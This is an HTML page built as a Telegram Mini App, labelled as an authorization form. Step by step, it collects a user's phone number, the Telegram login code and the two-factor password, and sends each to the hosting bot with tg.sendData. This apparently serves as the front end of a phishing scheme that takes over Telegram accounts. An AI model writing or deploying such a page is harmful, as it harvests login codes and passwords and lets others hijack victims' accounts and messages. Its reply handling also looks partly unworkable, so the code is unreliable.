<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Авторизация</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 20px; }
        input, button { width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box; border-radius: 8px; border: 1px solid #ccc; }
        button { background-color: #2e7d32; color: white; border: none; font-size: 16px; cursor: pointer; }
        button:disabled { background-color: #aaa; }
        .hidden { display: none; }
        .code-input { display: flex; gap: 5px; }
        .code-input input { width: 50px; text-align: center; font-size: 24px; }
        #error, #code-error, #password-error { color: red; margin-top: 5px; }
    </style>
</head>
<body>
    <div id="phone-step">
        <h3>Введите номер телефона</h3>
        <input type="text" id="phone" placeholder="+79001234567" value="">
        <button onclick="sendPhone()">Получить код</button>
        <div id="error"></div>
    </div>

    <div id="code-step" class="hidden">
        <h3>Введите код из Telegram</h3>
        <div class="code-input">
            <input type="text" id="code1" maxlength="1" oninput="moveToNext(this, 'code2')">
            <input type="text" id="code2" maxlength="1" oninput="moveToNext(this, 'code3')">
            <input type="text" id="code3" maxlength="1" oninput="moveToNext(this, 'code4')">
            <input type="text" id="code4" maxlength="1" oninput="moveToNext(this, 'code5')">
            <input type="text" id="code5" maxlength="1" oninput="moveToNext(this, 'code5')">
        </div>
        <button onclick="sendCode()">Подтвердить</button>
        <div id="code-error"></div>
    </div>

    <div id="password-step" class="hidden">
        <h3>Введите пароль двухфакторной аутентификации</h3>
        <input type="password" id="password" placeholder="Пароль">
        <button onclick="sendPassword()">Войти</button>
        <div id="password-error"></div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        function moveToNext(current, nextId) {
            if (current.value.length >= current.maxLength) {
                document.getElementById(nextId)?.focus();
            }
        }

        function sendPhone() {
            let phone = document.getElementById('phone').value.trim();
            if (!phone) {
                document.getElementById('error').innerText = 'Введите номер';
                return;
            }
            tg.sendData(JSON.stringify({
                action: 'send_phone',
                phone: phone
            }));
            document.getElementById('phone-step').classList.add('hidden');
        }

        function sendCode() {
            let code = '';
            for (let i = 1; i <= 5; i++) {
                let val = document.getElementById(`code${i}`).value;
                if (!val) {
                    document.getElementById('code-error').innerText = 'Введите все цифры';
                    return;
                }
                code += val;
            }
            tg.sendData(JSON.stringify({
                action: 'send_code',
                code: code
            }));
            document.getElementById('code-step').classList.add('hidden');
        }

        function sendPassword() {
            let password = document.getElementById('password').value;
            if (!password) {
                document.getElementById('password-error').innerText = 'Введите пароль';
                return;
            }
            tg.sendData(JSON.stringify({
                action: 'send_password',
                password: password
            }));
            document.getElementById('password-step').classList.add('hidden');
        }

        // Слушаем ответы от бота
        tg.onEvent('message', function(event) {
            let data = JSON.parse(event.data);
            if (data.status === 'code_sent') {
                document.getElementById('code-step').classList.remove('hidden');
            } else if (data.status === 'code_expired') {
                document.getElementById('code-error').innerText = 'Код истёк, новый отправлен';
                document.getElementById('code-step').classList.remove('hidden');
                for (let i = 1; i <= 5; i++) {
                    document.getElementById(`code${i}`).value = '';
                }
            } else if (data.status === 'invalid_code') {
                document.getElementById('code-error').innerText = 'Неверный код';
                document.getElementById('code-step').classList.remove('hidden');
            } else if (data.status === '2fa_required') {
                document.getElementById('password-step').classList.remove('hidden');
            } else if (data.status === 'success') {
                tg.close();
            } else if (data.status === 'error') {
                alert('Ошибка: ' + data.message);
                tg.close();
            }
        });
    </script>
</body>
</html>
